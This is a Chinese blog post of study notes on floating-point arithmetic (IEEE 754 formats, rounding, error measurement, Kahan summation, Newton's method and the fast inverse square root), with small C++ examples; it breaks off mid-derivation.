<p>为了表示小于 1 的值（负指数），IEEE 754 <strong>对指数值进行了偏移</strong>：<br> 实际的指数值 = <strong>存储的指数值 - 偏移量（Bias）</strong></p>
<ul>
<li>对于 <strong>单精度浮点数（float）</strong>，偏移量是 <strong>127</strong>，即： $e<em>{\text{real}} = e</em>{\text{stored}} - 127$</li>
<li>对于 <strong>双精度浮点数（double）</strong>，偏移量是 <strong>1023</strong>，即： $e<em>{\text{real}} = e</em>{\text{stored}} - 1023$</li>
</ul>
<p>假设上图为 IEEE 754 <strong>单精度浮点数</strong>：</p>
<script type="math/tex; mode=display">
(-1)^{0} \times 2^{(01111100)_2 - 127} \times (1 + 2^{-2})</script><p>解读步骤：</p>
<ol>
<li><strong>符号位 0</strong>，表示正数。</li>
<li><strong>指数部分 01111100₂ = 124</strong>，计算真实指数： $124 - 127 = -3$</li>
<li>尾数部分 IEEE 754 规定<strong>隐含的 1</strong>，即： $1 + 2^{-2} = 1.25$</li>
<li><strong>计算结果</strong>： $2^{-3} \times 1.25 = \frac{1.25}{8} = 0.15625$</li>
</ol>
<p>IEEE 754 标准定义了多个不同的浮点数格式，常见的有：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th>符号位</th>
<th>指数位</th>
<th>尾数位</th>
<th>总位数</th>
<th>约等于十进制精度</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>单精度（float）</strong></td>
<td>1</td>
<td>8</td>
<td>23</td>
<td>32</td>
<td>~7.2 位</td>
</tr>
<tr>
<td><strong>双精度（double）</strong></td>
<td>1</td>
<td>11</td>
<td>52</td>
<td>64</td>
<td>~15.9 位</td>
</tr>
<tr>
<td><strong>半精度（half）</strong></td>
<td>1</td>
<td>5</td>
<td>10</td>
<td>16</td>
<td>~3.3 位</td>
</tr>
<tr>
<td><strong>扩展精度（extended）</strong></td>
<td>1</td>
<td>15</td>
<td>64</td>
<td>80</td>
<td>~19.2 位</td>
</tr>
<tr>
<td><strong>四倍精度（quadruple）</strong></td>
<td>1</td>
<td>15</td>
<td>112</td>
<td>128</td>
<td>~34.0 位</td>
</tr>
<tr>
<td><strong>bfloat16</strong></td>
<td>1</td>
<td>8</td>
<td>7</td>
<td>16</td>
<td>~2.3 位</td>
</tr>
</tbody>
</table>
</div>
<p><strong>不同格式的应用</strong></p>
<ul>
<li><strong>单精度（float）和双精度（double）</strong>：大多数 CPU 都支持，C 语言中的 <code>float</code> 和 <code>double</code> 对应这两种格式。</li>
<li><strong>扩展精度（extended）</strong>：主要用于 <strong>x86 架构</strong>，C 语言中的 <code>long double</code> 通常是 <strong>80 位</strong>（部分 ARM 架构降级为 64 位）。</li>
<li><strong>四倍精度（quadruple）和 256 位“八倍精度”</strong>：主要用于高精度科学计算，不受主流硬件支持。</li>
<li><strong>半精度（half）</strong>：由于存储空间小、计算快，常用于 <strong>深度学习</strong> 和 <strong>计算机图形学</strong>。</li>
<li><strong>bfloat16</strong>：牺牲 3 位尾数，以获得与单精度相同的指数范围，适用于 <strong>机器学习</strong>（尤其是 <strong>神经网络</strong>）。</li>
</ul>
<p>较低精度的浮点数<strong>占用更少的存储空间</strong>，在某些应用场景下可以大幅提高运算速度。例如：</p>
<ul>
<li><strong>深度学习</strong> 中，通常不需要很高的数值精度，而是更关注计算吞吐量和并行性。</li>
<li><strong>Google TPU（张量处理单元）</strong> 专门为 <code>bfloat16</code> 设计，并能够 <strong>一次性计算 128×128 的矩阵乘法</strong>。</li>
<li><strong>NVIDIA Tensor Cores</strong> 可 <strong>一次执行 4×4 的矩阵运算</strong>，显著加速深度学习任务。</li>
</ul>
<h5 id="处理边界情况"><a href="#处理边界情况" class="headerlink" title="处理边界情况"></a>处理边界情况</h5><p>默认情况下，整数运算在遇到<strong>边界情况（Corner Cases）</strong>（例如<strong>除零</strong>）时，会导致程序<strong>崩溃</strong>。1996 年，<strong>阿丽亚娜 5 号（Ariane 5）</strong> 运载火箭<strong>首飞失败</strong>，原因就是计算系统在遇到<strong>算术错误</strong>时采取了<strong>终止计算</strong>的策略。具体来说，这次错误是由于<strong>浮点数转换为整数时溢出</strong>（Floating-point to Integer Overflow）。这个错误导致<strong>导航系统错误地认为火箭偏离了轨道</strong>，于是计算机进行了<strong>大幅修正</strong>，最终导致火箭解体，直接损失 <strong>2 亿美元（$200M）</strong>。</p>
<p><strong>硬件中断（Hardware Interrupts）</strong> 提供了一种更优雅的方式来处理异常情况。</p>
<p>当程序发生异常时，CPU 会：</p>
<ol>
<li><strong>中断程序的执行（Interrupt Execution）</strong>。</li>
<li><strong>收集所有相关信息</strong>，并存入一个特殊的数据结构，称为 <strong>“中断向量（Interrupt Vector）”</strong>。</li>
<li>将中断向量交给<strong>操作系统</strong>（OS）<ul>
<li>如果程序提供了<strong>异常处理代码</strong>（类似于 <code>try-except</code> 机制），OS 会调用处理代码。</li>
<li>如果没有，则直接<strong>终止程序</strong>。</li>
</ul>
</li>
</ol>
<p>硬件中断虽然可以优雅地处理异常，但<strong>速度很慢</strong>，不适合<strong>实时系统</strong>（如火箭导航）。</p>
<h5 id="NaNs、零和无穷大"><a href="#NaNs、零和无穷大" class="headerlink" title="NaNs、零和无穷大"></a>NaNs、零和无穷大</h5><div class="table-container">
<table>
<thead>
<tr>
<th><strong>类型</strong></th>
<th><strong>特点</strong></th>
<th><strong>数学运算</strong></th>
<th><strong>二进制表示</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>无穷大（Infinity）</strong></td>
<td>由于数值溢出产生</td>
<td>$\infty + x = \infty$，$x / \infty = 0$</td>
<td><strong>指数全 1，尾数全 0</strong></td>
</tr>
<tr>
<td><strong>正零（+0.0）</strong></td>
<td>可能导致优化问题</td>
<td>$1/+0 = +\infty$</td>
<td><strong>所有位为 0</strong></td>
</tr>
<tr>
<td><strong>负零（-0.0）</strong></td>
<td>更适合作为初始化值</td>
<td>$1 / -0 = -\infty$</td>
<td><strong>符号位 1，其余 0</strong></td>
</tr>
<tr>
<td><strong>NaN（非数）</strong></td>
<td>计算非法数学运算时出现</td>
<td>$\infty - \infty$, $0 \times \infty$, $0 / 0$</td>
<td><strong>指数全 1，尾数非 0</strong></td>
</tr>
<tr>
<td><strong>信号 NaN（sNaN）</strong></td>
<td>触发异常标志</td>
<td>可能引发中断</td>
<td><strong>指数全 1，尾数部分非 0</strong></td>
</tr>
<tr>
<td><strong>静默 NaN（qNaN）</strong></td>
<td>在计算中传播</td>
<td>结果仍然是 NaN</td>
<td><strong>指数全 1，尾数部分非 0</strong></td>
</tr>
</tbody>
</table>
</div>
<h4 id="舍入误差"><a href="#舍入误差" class="headerlink" title="舍入误差"></a>舍入误差</h4><p>硬件浮点数的舍入方式非常简单：<strong>只有当运算结果无法精确表示时才会发生舍入</strong>，默认情况下<strong>向最接近的可表示数舍入</strong>（如果有两个同样接近的候选值，则<strong>优先选择以 0 结尾的那个</strong>）。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">float</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">1</span> &lt;&lt; <span class="number">25</span>); i++)</span><br><span class="line">    x++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%f\n&quot;</span>, x);</span><br></pre></td></tr></table></figure></div>
<p><strong>预期数学结果</strong>：</p>
<script type="math/tex; mode=display">
2^{25} = 33554432</script><p>但实际输出的是：</p>
<script type="math/tex; mode=display">
2^{24} = 16777216</script><p>浮点数的<strong>精度有限</strong>，当 <code>x</code> 变得足够大时，<code>x + 1</code> 可能无法被精确表示，导致<strong>舍入误差</strong>。</p>
<p>具体来说：</p>
<ul>
<li>32 位 <code>float</code> 使用 <strong>23 位尾数 </strong>，有效的精度为 <strong>24 位二进制位</strong>。</li>
<li>当 <code>x = 2^&#123;24&#125; = 16777216</code> 时：<ul>
<li>计算 <code>x + 1 = 16777217</code>，由于 <code>16777217</code> 无法在 <code>float</code> 精度范围内精确表示，它会<strong>被舍入回 16777216</strong>（因为 <code>16777217</code> 与 <code>16777216</code> 距离相等，按“以 0 结尾优先”的规则，舍入回 <code>16777216</code>）。</li>
</ul>
</li>
<li>由于 <code>x</code> 不再发生变化，循环继续执行但 <code>x</code> 不再增长，最终 <code>x</code> 仍然停留在 <code>16777216</code>。</li>
</ul>
<p>在 <code>2^24</code> 之前，<code>x + 1</code> <strong>可以被精确表示</strong>，所以加 1 没有舍入误差，一直到 <code>x = 2^24</code> 才开始丢失精度。比如当 <code>x = 2^&#123;24&#125;</code> 时，它的二进制表示如下，注意到为了与24的指数对齐（每乘一个2相当于小数点右移一位），下面的表示有24位的尾数，实际上最后的一位0是不存在的：</p>
<script type="math/tex; mode=display">
1.000000000000000000000000 × 2^{24}</script><p>这时，如果我们 加 1（即 x + 1），结果是：</p>
<script type="math/tex; mode=display">
1.000000000000000000000001 × 2^{24}</script><p>但由于尾数只有23位，所以需要进行舍入，默认是<strong>最接近偶数舍入</strong>，也就是舍入后最后一位为0，在这里就相当于向下舍入了，所以<code>x + 1</code>被舍入回<code>x</code>。</p>
<p><strong>浮点运算顺序影响结果</strong></p>
<p>浮点运算的结果<strong>可能取决于计算顺序</strong>，即使它们在数学上是等价的。</p>
<p>在数学上，加法和乘法满足：</p>
<script type="math/tex; mode=display">
(x + y) + z = x + (y + z)</script><p>但在浮点计算中，由于舍入误差：</p>
<script type="math/tex; mode=display">
(x + y) + z \neq x + (y + z)</script><p>在某些情况下，这些计算顺序的不同可能导致不同的最终结果。</p>
<p>通常，编译器不会随意调整计算顺序，以保证符合 IEEE 754 规范。但如果开启 <strong><code>-ffast-math</code></strong>（GCC/Clang），编译器会<strong>忽略一些浮点计算的精度规则</strong>，可能会：</p>
<ul>
<li>重新排序运算，提高性能</li>
<li>产生不同的浮点计算结果</li>
</ul>
<p>如果在上面的 <code>x++</code> 循环代码中开启 <code>-ffast-math</code>，程序可能会<strong>跳过中间精度检查</strong>，从而最终得到 <strong>33554432</strong>，但这也可能带来更大的舍入误差。</p>
<p><strong>不同的舍入模式</strong></p>
<p>除了默认的<strong>向偶数舍入（Banker’s Rounding）</strong>，IEEE 754 还提供了 <strong>4 种舍入模式</strong>：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th><strong>舍入模式</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Round to Nearest (默认)</strong></td>
<td>取最近的可表示值，在两边距离相等时取偶数</td>
</tr>
<tr>
<td><strong>Round Up (<code>FE_UPWARD</code>)</strong></td>
<td>向 <code>+∞</code> 方向舍入（负数趋向于 <code>0</code>）</td>
</tr>
<tr>
<td><strong>Round Down (<code>FE_DOWNWARD</code>)</strong></td>
<td>向 <code>-∞</code> 方向舍入（负数远离 <code>0</code>）</td>
</tr>
<tr>
<td><strong>Round Toward Zero (<code>FE_TOWARDZERO</code>)</strong></td>
<td>直接截断，不做四舍五入</td>
</tr>
</tbody>
</table>
</div>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fenv.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">fesetround</span>(FE_UPWARD);  <span class="comment">// 设置为向上舍入</span></span><br><span class="line">    <span class="type">float</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">1</span> &lt;&lt; <span class="number">25</span>); i++)</span><br><span class="line">        x++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%f\n&quot;</span>, x);  <span class="comment">// 输出 2^26 = 67108864</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>解释</strong></p>
<ul>
<li>在 <code>2^24</code> 之后，每次 <code>x + 1</code> 被舍入到 <code>x + 2</code>，因此增长速度<strong>翻倍</strong>。</li>
<li>继续增长到 <code>2^25</code> 后，每次 <code>x + 1</code> 会被舍入到 <code>x + 4</code>，增长速度再翻倍。</li>
<li>最终 <code>x</code> 以四倍速增长，达到 <code>2^26 = 67108864</code>。</li>
</ul>
<h5 id="误差测量"><a href="#误差测量" class="headerlink" title="误差测量"></a>误差测量</h5><p>在计算机执行浮点数运算时，我们通常关心 <strong>两种误差测量方式</strong>：</p>
<ol>
<li><p><strong>单位最后一位误差（ULP, Units in the Last Place）</strong></p>
<ul>
<li>这是衡量计算结果和真实值之间的偏差，以 <strong>可表示浮点数单位</strong> 计算的误差。</li>
<li>例如，如果某个计算结果比真实值小 <strong>1 ULP</strong>，意味着它比实际值小了一个可表示的浮点数单位。</li>
<li>在 IEEE 754 标准下，单次基本运算的最坏情况 <strong>不会超过 0.5 ULP</strong>，因为采用的是“四舍五入到最接近可表示数”策略。</li>
</ul>
</li>
<li><p><strong>相对误差</strong></p>
<ul>
<li><p>计算公式：</p>
<script type="math/tex; mode=display">
\frac{| v - v' |}{| v |}</script><p>其中，$v$ 是 <strong>理论值</strong>，$v’$ 是 <strong>浮点运算后的值</strong>。</p>
</li>
<li><p>数值分析中，更关心 <strong>相对误差</strong>，因为它衡量了结果的 <strong>比例误差</strong>，而不仅仅是绝对误差。</p>
</li>
</ul>
</li>
</ol>
<p><strong>机器精度（Machine Epsilon, ϵ）</strong></p>
<p>机器精度 $\epsilon$ 定义为：</p>
<script type="math/tex; mode=display">
\epsilon = \text{下一个可表示的数} - 1</script><p>对于 <strong>IEEE 754 单精度浮点数（float, 32-bit）</strong>：</p>
<ul>
<li><p>有 <strong>23 位尾数</strong>，所以：</p>
<script type="math/tex; mode=display">
\epsilon = 2^{-23} \approx 1.19 \times 10^{-7}</script></li>
<li><p>这意味着，<strong>最小可区分的数大约是 $1.19 \times 10^{-7}$</strong>。</p>
</li>
</ul>
<p>对于 <strong>IEEE 754 双精度浮点数（double, 64-bit）</strong>：</p>
<ul>
<li>有 <strong>52 位尾数</strong>，所以：<script type="math/tex; mode=display">
\epsilon = 2^{-52} \approx 2.22 \times 10^{-16}</script></li>
</ul>
<p><strong>误差范围估计</strong></p>
<p>假设执行单次浮点运算后，得到结果 $x$，那么实际值 $x_{\text{真实}}$ 可能在范围：</p>
<script type="math/tex; mode=display">
[x \cdot (1 - \epsilon), x \cdot (1 + \epsilon)]</script><p><strong>浮点数比较</strong></p>
<p>由于浮点数存在精度误差，<strong>直接比较 <code>a == b</code> 可能不可靠</strong>，所以通常采用 <strong>“误差范围判断”</strong>：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">float</span> eps = std::numeric_limits&lt;<span class="type">float</span>&gt;::<span class="built_in">epsilon</span>(); <span class="comment">// 约 2^(-23)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">eq</span><span class="params">(<span class="type">float</span> a, <span class="type">float</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> std::<span class="built_in">abs</span>(a - b) &lt;= eps;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>如果 <code>a</code> 和 <code>b</code> 相差小于机器精度 <code>eps</code>，就认为它们相等。</li>
<li>但这种方法 <strong>只适用于单次运算误差</strong>，多个计算累积误差后可能需要更大的 <code>eps</code> 进行容忍。</li>
</ul>
<h5 id="浮点误差的累积"><a href="#浮点误差的累积" class="headerlink" title="浮点误差的累积"></a>浮点误差的累积</h5><p>如果进行 <strong>n 次</strong> 乘法运算，每次的误差上界约为 $(1 + \epsilon)$，那么累积误差大致为：</p>
<script type="math/tex; mode=display">
(1+\epsilon)^n \approx 1 + n\epsilon + O(\epsilon^2)</script><p>这意味着<strong>误差会随着运算次数线性增长</strong>。在大多数情况下，如果 $n \ll 1/\epsilon$，误差增长仍然是可接受的。</p>
<h5 id="数值不稳定性与避免方法"><a href="#数值不稳定性与避免方法" class="headerlink" title="数值不稳定性与避免方法"></a>数值不稳定性与避免方法</h5><p>某些计算方式会<strong>放大浮点误差</strong>，导致数值不稳定。例如：</p>
<h5 id="不稳定计算"><a href="#不稳定计算" class="headerlink" title="不稳定计算"></a><strong>不稳定计算</strong></h5><script type="math/tex; mode=display">
f(x, y) = x^2 - y^2</script><p>计算误差分析：</p>
<script type="math/tex; mode=display">
f'(x, y) = x^2(1+\epsilon) - y^2(1-\epsilon) - (x^2 - y^2) = (x^2 + y^2) \cdot \epsilon</script><p>相对误差：</p>
<script type="math/tex; mode=display">
\frac{(x^2 + y^2) \cdot \epsilon}{x^2 - y^2}</script><p>当 $x \approx y$ 时，分母趋近于 0，误差会急剧放大。</p>
<p><strong>稳定计算方式</strong></p>
<script type="math/tex; mode=display">
f(x, y) = (x + y) \cdot (x - y)</script><p>其误差上界为：</p>
<script type="math/tex; mode=display">
\epsilon \cdot |x - y|</script><p>显然，新的计算方式避免了数值放大问题，并且只需要 <strong>2 次加法和 1 次乘法</strong>，比原来的 <strong>1 次减法和 2 次乘法</strong> 更高效。</p>
<h5 id="Kahan-求和算法"><a href="#Kahan-求和算法" class="headerlink" title="Kahan 求和算法"></a>Kahan 求和算法</h5><p>标准的浮点数求和算法如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">float</span> s = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    s += a[i];</span><br></pre></td></tr></table></figure></div>
<p>如果数值的数量级不同（特别是存在非常大的数和非常小的数），则相对误差不再仅仅是 $O(n\epsilon)$，而是 <strong>严重依赖输入数据</strong>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> n = (<span class="number">1</span>&lt;&lt;<span class="number">24</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, n);  <span class="comment">// 打印 16777216</span></span><br><span class="line"></span><br><span class="line"><span class="type">float</span> s = n;  <span class="comment">// 2^24</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    s += <span class="number">1.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%f\n&quot;</span>, s);  <span class="comment">// 仍然是 16777216.000000</span></span><br></pre></td></tr></table></figure></div>
<p>这里 $2^{24} + 1$ 超出了 <code>float</code> 的 <strong>23 位尾数（mantissa）</strong> 所能精确表示的范围，因此所有的 <code>+1.0</code> 操作 <strong>都会被舍入掉</strong>，导致最终的计算结果没有变化。</p>
<p>这种情况表明，<strong>绝对误差</strong> 为 $O(n\epsilon)$，而不是 <strong>相对误差</strong>，这意味着即使 <code>n</code> 变大，错误也不会自动被归一化，而是会无限增长。</p>
<p><strong>Kahan 求和算法核心思想</strong></p>
<p>为了减少舍入误差，我们可以将 <strong>未被累加的部分存储起来</strong>，并在后续计算中补偿它：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">float</span> s = <span class="number">0</span>, c = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="type">float</span> y = a[i] - c;  <span class="comment">// 计算当前值减去累积误差</span></span><br><span class="line">    <span class="type">float</span> t = s + y;     <span class="comment">// 计算新的和</span></span><br><span class="line">    c = (t - s) - y;     <span class="comment">// 计算新的误差</span></span><br><span class="line">    s = t;               <span class="comment">// 更新和</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ol>
<li><code>y = a[i] - c</code> ：提取 $a[i]$ 的 <strong>低精度部分</strong>。</li>
<li><code>t = s + y</code> ：执行加法，但 <code>y</code> 可能过小以至于无法准确表示。</li>
<li><code>c = (t - s) - y</code> ：从计算结果 <code>t</code> 中恢复被丢弃的低精度部分，并存入 <code>c</code> 进行下一轮补偿。</li>
</ol>
<p>Kahan 求和的 <strong>相对误差上界</strong> 为：</p>
<script type="math/tex; mode=display">
2\epsilon + O(n\epsilon^2)</script><p>相比于普通加法的 $O(n\epsilon)$ 误差，这个改进显著降低了精度损失。</p>
<p>如果需要进一步提高精度，可以使用 <strong>double-double 算术</strong>，即用两个 <code>double</code> 变量存储一个高精度数：</p>
<script type="math/tex; mode=display">
a + b</script><p>其中：</p>
<ul>
<li><code>a</code> 存储高位部分（高精度）</li>
<li><code>b</code> 存储低位部分（误差修正）</li>
</ul>
<p>这种方法可以推广到 <strong>四精度（quad-double）</strong>，甚至更高精度的算术运算。</p>
<h4 id="牛顿法"><a href="#牛顿法" class="headerlink" title="牛顿法"></a>牛顿法</h4><p>牛顿法是一个简单而强大的算法，用于寻找实值函数的近似根，也就是解决以下通用方程的根：</p>
<script type="math/tex; mode=display">
f(x) = 0</script><p>牛顿法的假设条件是：至少存在一个根，且函数 $f(x)$ 在搜索区间上是连续且可导的。虽然存在一些特殊的边界情况，但它们在实际应用中几乎不会发生。</p>
<p>牛顿法的基本思想是：从某个初始的近似值 $x<em>0$ 开始，然后通过迭代方法不断改进该值。每次迭代时，我们会在 $x = x_i$ 处画出该函数的切线，并让下一个近似值 $x</em>{i+1}$ 等于切线与 $x$-轴的交点的横坐标。直观上，如果函数 $f(x)$ 是“良好的”且 $x<em>i$ 已经足够接近根，那么 $x</em>{i+1}$ 会比 $x_i$ 更接近根。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/newton.png"
                      class=""
                >
<p>为了得到交点 $x_{i+1}$，我们需要将切线函数设为零：</p>
<script type="math/tex; mode=display">
0 = f(x_i) + (x_{i+1} - x_i) f'(x_i)</script><p>从中我们可以推导出牛顿法的迭代公式：</p>
<script type="math/tex; mode=display">
x_{i+1} = x_i - \frac{f(x_i)}{f'(x_i)}</script><p>牛顿法非常重要，它是许多科学与工程中的优化求解器的基础。</p>
<h5 id="平方根的牛顿法求解"><a href="#平方根的牛顿法求解" class="headerlink" title="平方根的牛顿法求解"></a>平方根的牛顿法求解</h5><p>首先，假设我们要解的是方程：</p>
<script type="math/tex; mode=display">
x = \sqrt{n} \iff x^2 = n \iff f(x) = x^2 - n = 0</script><p>我们将 $f(x) = x^2 - n$ 代入牛顿法的迭代公式中，可以得到以下的更新规则：</p>
<script type="math/tex; mode=display">
x_{i+1} = x_i - \frac{f(x_i)}{f'(x_i)} = x_i - \frac{x_i^2 - n}{2x_i}</script><p>经过整理，可以得到：</p>
<script type="math/tex; mode=display">
x_{i+1} = \frac{x_i + \frac{n}{x_i}}{2}</script><p>这个公式就是用来求平方根的迭代公式。每次通过更新 $x_i$ 来逼近 $\sqrt{n}$。</p>
<p>在实际应用中，我们希望在结果足够接近真实值时停止迭代。可以通过检查每次迭代后的结果差距是否小于某个阈值来实现这一点。以下是用代码实现的例子：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">double</span> EPS = <span class="number">1e-9</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">sqrt</span><span class="params">(<span class="type">double</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> x = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">abs</span>(x * x - n) &gt; EPS)</span><br><span class="line">        x = (x + n / x) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>该算法对于许多函数都是收敛的，但它只对某些特定类型的函数（如凸函数）能可靠地收敛。另一个问题是收敛的速度，若收敛发生，它的速度如何？对于平方根的求解，牛顿法通常表现得非常快。</p>
<h5 id="收敛速度分析"><a href="#收敛速度分析" class="headerlink" title="收敛速度分析"></a>收敛速度分析</h5><p>以求 $\sqrt{2}$，从初始值 $x_0 = 1$ 开始为例：</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">1.0000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">1.5000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">1.4166666666666666666666666666666666666666666666666666666666675</span><br><span class="line">1.4142156862745098039215686274509803921568627450980392156862745</span><br><span class="line">1.4142135623746899106262955788901349101165596221157440445849057</span><br><span class="line">1.4142135623730950488016896235025302436149819257761974284982890</span><br><span class="line">1.4142135623730950488016887242096980785696718753772340015610125</span><br><span class="line">1.4142135623730950488016887242096980785696718753769480731766796</span><br></pre></td></tr></table></figure></div>
<p>仔细观察，我们可以看到每次迭代后正确的数字位数大约是翻倍的。这种惊人的收敛速度并非偶然。</p>
<p><strong>定量分析收敛速度</strong></p>
<p>为了定量地分析收敛速度，我们需要考虑第 $i$ 次迭代的相对误差 $\delta<em>i$，并确定下一次迭代后误差 $\delta</em>{i+1}$ 会减少多少。</p>
<p>我们可以表达 $x_i$ 为 $x \cdot (1 + \delta_i)$。将其代入牛顿法的迭代公式，经过推导得到：</p>
<script type="math/tex; mode=display">
1 + \delta_{i+1} = \frac{1}{2} \left( 1 + \frac{1 + \delta_i}{1 + \delta_i} \right) = 1 + \frac{\delta_i^2}{2} + o(\delta_i^2)</script><p>这表示误差大约在每次迭代时平方并减半。</p>
<p><strong>误差的平方</strong></p>
<p>从上面的公式可以得出：</p>
<script type="math/tex; mode=display">
\delta_{i+1} = \frac{\delta_i^2}{2} + o(\delta_i^2)</script><p>这意味着每次迭代时误差大致是上一轮误差的平方。也就是说，当我们接近解决方案时，误差的大小减少得非常快，接近于平方的收敛速度。</p>
<p><strong>对数与准确位数</strong></p>
<p>由于 $-\log_{10} \delta_i$ 大致等于答案 $x_i$ 的有效数字的位数，误差的平方恰好对应着有效数字的位数翻倍。因此，牛顿法表现出的是<strong>二次收敛</strong>（Quadratic Convergence）特性。</p>
<p><strong>一般性的二次收敛</strong></p>
<p>事实上，这种二次收敛不仅限于求平方根的问题。根据详细的证明可以证明，一般来说，对于任何合适的函数，牛顿法的误差会以二次速度收敛。假设函数的导数 $f’(x) \neq 0$ 且二阶导数 $f’’(x)$ 连续，则牛顿法至少能保证二次收敛。</p>
<p>具体公式如下：</p>
<script type="math/tex; mode=display">
|\delta_{i+1}| = \frac{2 \cdot |f'(x_n)|}{|f''(x_i)|} \cdot \delta_i^2</script><p>这就是牛顿法的二次收敛特性，它使得每次迭代都能显著提高结果的精度。</p>
<h4 id="平方根倒数速算法"><a href="#平方根倒数速算法" class="headerlink" title="平方根倒数速算法"></a>平方根倒数速算法</h4><p>倒数平方根是浮点数的一个重要计算，广泛应用于计算归一化向量，而归一化向量又在各种模拟场景中得到广泛应用，例如计算机图形学（例如，用于确定入射角和反射角来模拟光照）。</p>
<p>归一化向量的计算公式如下：</p>
<script type="math/tex; mode=display">
\hat{v} = \frac{v}{\sqrt{v_x^2 + v_y^2 + v_z^2}}</script><p>其中，$v_x$, $v_y$, $v_z$ 分别是向量 $v$ 在 $x$, $y$, 和 $z$ 方向上的分量。</p>
<p>直接计算倒数平方根的方法，即先计算平方根再求倒数，速度非常慢，因为这两项操作虽然在硬件中实现，但仍然非常耗时。</p>
<p>然而，存在一种非常高效的近似算法，它利用了浮点数在内存中的存储方式。事实上，这个算法非常优秀，以至于它被直接实现到硬件中，因此它对软件开发者来说不再那么重要。然而，考虑到它的内在美和教育价值，仍然值得我们深入探讨。</p>
<h5 id="近似对数的计算"><a href="#近似对数的计算" class="headerlink" title="近似对数的计算"></a>近似对数的计算</h5><p>根据对数的性质，有如下恒等式：</p>
<script type="math/tex; mode=display">
\log_2 \frac{1}{\sqrt{x}} = -\frac{1}{2} \log_2 x</script><p>快速倒数平方根正是基于这个恒等式，有了x关于2的对数后，我们就可以反查对数表得到$\frac{1}{\sqrt{x}}$的值，因此它需要<strong>非常快速地计算 $x$ 的对数</strong>。事实证明，我们可以通过将32位浮点数重新解释为整数来近似计算对数。</p>
<p>回顾浮点数的表示方式，它按顺序存储符号位（对正数来说为0）、指数 $e_x$ 和尾数 $m_x$，因此浮点数 $x$ 的表示可以写成（B为偏置）：</p>
<script type="math/tex; mode=display">
x = (-1)^s \times 2^{e_x-B} \times (1 + m_x)</script><p>其对数为：</p>
<script type="math/tex; mode=display">
\log_2 x = e_x + \log_2(1 + m_x)</script><p>由于 $m_x \in [0, 1)$，因此右侧的对数可以近似为：</p>
<script type="math/tex; mode=display">
\log_2(1 + m_x) \approx m_x</script><p>这个近似在区间的两端是精确的，但为了考虑平均情况，我们需要用一个小常数 $\sigma$ 来调整它，因此：</p>
<script type="math/tex; mode=display">
